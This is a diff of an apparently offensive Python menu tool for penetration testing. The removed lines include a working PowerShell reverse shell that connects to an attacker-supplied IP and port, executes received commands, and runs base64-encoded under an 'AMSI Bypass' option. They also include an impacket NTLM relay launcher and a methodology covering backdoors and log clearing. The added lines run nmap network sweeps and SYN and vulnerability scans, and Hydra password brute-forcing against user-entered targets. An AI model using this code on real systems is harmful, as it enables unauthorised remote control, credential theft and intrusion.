@@ -11,11 +11,10 @@
 ######################################################################################################################################################################################################################
 
 
+import os
 import subprocess
 import sys
-import os
 import shutil
-import base64
 from colorama import Fore, Style
 
 # Splash Screen
@@ -47,145 +46,95 @@ _____________________  ___________                                              
     """
     print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")
 
-# Columnar Display Helper Function
-def display_in_columns(options, column_count=2):
-    max_length = max(len(option) for option in options)
-    formatted_options = [
-        f"[{index+1}] {option:<{max_length}}" 
-        for index, option in enumerate(options)
+# Check and Install Tools
+def check_tool(tool_name, install_command):
+    if shutil.which(tool_name):
+        print(f"{Fore.GREEN}{tool_name} is already installed.{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.RED}{tool_name} is not installed.{Style.RESET_ALL}")
+        choice = input(f"Do you want to install {tool_name}? (y/n): ").lower()
+        if choice == "y":
+            subprocess.run(install_command, shell=True)
+        else:
+            print(f"{Fore.YELLOW}Skipping installation of {tool_name}.{Style.RESET_ALL}")
+
+def install_required_tools():
+    tools = {
+        "nmap": "sudo apt-get install -y nmap",
+        "hydra": "sudo apt-get install -y hydra",
+        "msfvenom": "sudo apt-get install -y metasploit-framework",
+        "veil": "sudo apt-get install -y veil",
+        "impacket": "pip install impacket"
+    }
+    for tool, command in tools.items():
+        check_tool(tool, command)
+
+# Methodology Menu
+def penetration_test_methodology():
+    print("\nPenetration Testing Methodology:")
+    options = [
+        "Network Discovery",
+        "Port Scanning with Nmap",
+        "Vulnerability Scanning",
+        "Return to Main Menu"
     ]
-    for i in range(0, len(formatted_options), column_count):
-        print("    ".join(formatted_options[i:i + column_count]))
+    for i, option in enumerate(options, 1):
+        print(f"[{i}] {option}")
+    try:
+        choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
+        if choice == 1:
+            network_discovery()
+        elif choice == 2:
+            port_scanning()
+        elif choice == 3:
+            vulnerability_scanning()
+        elif choice == 4:
+            main_menu()
+        else:
+            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
+            penetration_test_methodology()
+    except ValueError:
+        print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")
+        penetration_test_methodology()
 
-# Check Tool Installation
-def check_tool(tool_name):
-    return shutil.which(tool_name) is not None
+# Example Methodology Actions
+def network_discovery():
+    print(f"{Fore.CYAN}Performing Network Discovery...{Style.RESET_ALL}")
+    subprocess.run(["nmap", "-sn", "192.168.0.0/24"])
 
-def install_tool(tool_name):
-    if sys.platform.startswith("linux"):
-        subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])
-    else:
-        print(f"{Fore.RED}Automatic installation not supported on this OS.{Style.RESET_ALL}")
+def port_scanning():
+    print(f"{Fore.CYAN}Performing Port Scanning...{Style.RESET_ALL}")
+    target = input("Enter target IP or domain: ")
+    subprocess.run(["nmap", "-sS", target])
 
-def check_and_install_tools(tools):
-    for tool in tools:
-        if not check_tool(tool):
-            print(f"{Fore.RED}{tool} is not installed.{Style.RESET_ALL}")
-            choice = input(f"Do you want to install {tool}? (y/n): ").lower()
-            if choice == "y":
-                install_tool(tool)
-
-# Methodology Layout
-def display_methodology():
-    methodology = """
-    Penetration Testing Methodology:
-
-    1. Reconnaissance (Information Gathering)
-        - Network Discovery
-        - OS Fingerprinting
-        - Service Enumeration
-
-    2. Scanning & Enumeration
-        - Vulnerability Scanning
-        - Enumeration of SMB, DNS, HTTP, etc.
-        - Port Scanning with Nmap
-
-    3. Exploitation
-        - Web Application Exploits
-        - Network Exploits
-        - Social Engineering Attacks
-
-    4. Gaining Access
-        - Brute Force Attacks (SSH, HTTP, SMB, etc.)
-        - Remote Exploits
-        - Web Shells
-
-    5. Maintaining Access
-        - Creating Backdoors
-        - Installing Persistent Agents
-        - Privilege Escalation
-
-    6. Covering Tracks
-        - Log Clearing
-        - History Deletion
-        - Traffic Spoofing
-
-    7. Reporting & Results
-        - Documenting Findings
-        - Recommendations
-        - Executive Summary
-
-    """
-    print(f"{Fore.CYAN}{methodology}{Style.RESET_ALL}")
-
-# Reverse Shell Execution
-def execute_reverse_shell(ip, port):
-    code = f"""
-    $client = New-Object System.Net.Sockets.TCPClient("{ip}", {port});
-    $stream = $client.GetStream();
-    $writer = New-Object System.IO.StreamWriter($stream);
-    $buffer = New-Object byte[] 1024;
-    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {{
-        $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead);
-        $output = Invoke-Expression $data 2>&1 | Out-String;
-        $writer.WriteLine($output);
-        $writer.Flush();
-    }}
-    """
-    encoded_script = base64.b64encode(code.encode("utf-16le")).decode("ascii")
-    if shutil.which("powershell"):
-        subprocess.run(["powershell", "-EncodedCommand", encoded_script], shell=True)
-    else:
-        print(f"{Fore.RED}PowerShell is not available on this system.{Style.RESET_ALL}")
-
-# AMSI Bypass Menu
-def amsi_bypass_menu():
-    print(f"\n{Fore.CYAN}AMSI Bypass and Reverse Shell Execution:{Style.RESET_ALL}")
-    ip = input(f"{Fore.YELLOW}Enter the Attacker IP: {Style.RESET_ALL}")
-    port = input(f"{Fore.YELLOW}Enter the Attacker Port: {Style.RESET_ALL}")
-    
-    if not port.isdigit() or not (1 <= int(port) <= 65535):
-        print(f"{Fore.RED}Invalid port number! Please enter a valid port (1-65535).{Style.RESET_ALL}")
-        return
-    
-    execute_reverse_shell(ip, int(port))
-
-# NTLM Relay Attack
-def ntlm_relay_attack(target_ip, target_port):
-    print(f"Running NTLM Relay Attack on {target_ip}:{target_port}...")
-    command = f"python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t {target_ip}:{target_port} -smb2support"
-    subprocess.run(command, shell=True)
+def vulnerability_scanning():
+    print(f"{Fore.CYAN}Performing Vulnerability Scanning...{Style.RESET_ALL}")
+    subprocess.run(["nmap", "--script", "vuln", "192.168.0.1"])
 
 # Gaining Access Menu
 def gaining_access_menu():
-    print(f"\n{Fore.CYAN}Gaining Access:{Style.RESET_ALL}")
+    print("\nGaining Access:")
     options = [
         "Launch MSFVenom",
         "Launch Metasploit",
-        "Launch Veil",
         "Brute Force with Hydra",
-        "Exploit SMB with EternalBlue",
-        "Web Shell Upload",
-        "Yersinia Suite",
-        "AMSI Bypass and Reverse Shell Execution",
-        "NTLM Relay Attack (Impacket)",
         "Return to Main Menu"
     ]
-    display_in_columns(options, column_count=2)
-
+    for i, option in enumerate(options, 1):
+        print(f"[{i}] {option}")
     try:
-        choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
-        if 1 <= choice <= len(options):
-            if choice == 8:
-                amsi_bypass_menu()
-            elif choice == 9:
-                target_ip = input("Enter target IP for NTLM relay: ")
-                target_port = input("Enter target port for NTLM relay: ")
-                ntlm_relay_attack(target_ip, target_port)
-            elif choice == 10:
-                main_menu()
-            else:
-                print(f"{Fore.RED}This option is under development.{Style.RESET_ALL}")
+        choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
+        if choice == 1:
+            subprocess.run(["msfvenom"])
+        elif choice == 2:
+            subprocess.run(["msfconsole"])
+        elif choice == 3:
+            target = input("Enter target IP: ")
+            username = input("Enter username: ")
+            password_list = input("Enter path to password list: ")
+            subprocess.run(["hydra", "-l", username, "-P", password_list, target])
+        elif choice == 4:
+            main_menu()
         else:
             print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
             gaining_access_menu()
@@ -196,20 +145,18 @@ def gaining_access_menu():
 # Main Menu
 def main_menu():
     display_splash_screen()
-    check_and_install_tools(['nmap', 'hydra', 'msfvenom', 'metasploit', 'veil', 'impacket'])
-
+    install_required_tools()
     options = [
         "Penetration Testing Methodology",
         "Gaining Access Menu",
         "Exit"
     ]
-    display_in_columns(options)
-
+    for i, option in enumerate(options, 1):
+        print(f"[{i}] {option}")
     try:
-        choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
+        choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
         if choice == 1:
-            display_methodology()
-            main_menu()
+            penetration_test_methodology()
         elif choice == 2:
             gaining_access_menu()
         elif choice == 3:
@@ -222,6 +169,6 @@ def main_menu():
         print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")
         main_menu()
 
-# Run Main Menu
+# Entry Point
 if __name__ == "__main__":
     main_menu()
